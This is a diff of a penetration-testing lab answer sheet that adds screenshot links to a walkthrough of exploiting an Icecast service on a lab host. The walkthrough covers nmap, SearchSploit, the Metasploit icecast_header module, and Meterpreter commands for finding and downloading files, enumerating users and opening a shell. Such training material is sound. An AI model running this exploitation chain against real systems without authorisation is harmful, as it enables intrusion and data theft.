@@ -53,16 +53,14 @@ You've been provided full access to the network and are getting ping responses f
 
       > Answer: nmap -sV 192.168.0.20
 
-      ![icecast](images/icecast.jpg)
- 
- 
+       
 2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
  
    - Run the SearchSploit commands to show available Icecast exploits.
   
-     > Answer: **_SearchSploit icecast_**
+     > Answer: **_search icecast_**
 
-     ![searchsploit](images/searchsploit.jpg)
+     ![searchsploit](images/searchiceploit.jpg)
 
 3. Now that we know which exploits are available to us, let's start Metasploit:
  
@@ -76,6 +74,8 @@ You've been provided full access to the network and are getting ping responses f
    - Run the command to search for the Icecast module:
      
      > Answer: **_use exploit/windows/http/icecast_header_**
+
+     ![#4](images/#4.jpg)
  
 
    - Run the command to use the Icecast module:
@@ -96,10 +96,14 @@ You've been provided full access to the network and are getting ping responses f
    - Run the command that runs the Icecast exploit.
       
      > Answer: **_exploit_**
+
+     ![#6](#6.jpg)
  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
      > Answer: **_search -f *secretfile*.txt_**
+
+     ![#6-2](images/#6-2.jpg)
   
  7. You should now have a Meterpreter session open.
  
@@ -112,12 +116,15 @@ You've been provided full access to the network and are getting ping responses f
 
 
       > Answer: **_download /users/ieuser/documents/Drinks.recipe.txt_**
+
+      ![#7](images/#7.jpg)
  
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
 **_run post/multi/recon/local_exploit_suggester_**
 
+![#8](images/#8.jpg)
  
    - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
 
@@ -128,15 +135,21 @@ You've been provided full access to the network and are getting ping responses f
 A. Run a Meterpreter post script that enumerates all logged on users.
 
   > Answer: **_run post/windows/gather/enum_logged_on_users_**
+
+  ![A](images/A.jpg)
  
      
 B. Open a Meterpreter shell and gather system information for the target.
  
   > Answer: **_shell_**
+
+  ![B](images/B.jpg)
  
 C. Run the command that displays the target's computer system information:
 
    > Answer: **_systeminfo_**
+
+   ![C](images/C.jpg)
 
 
 
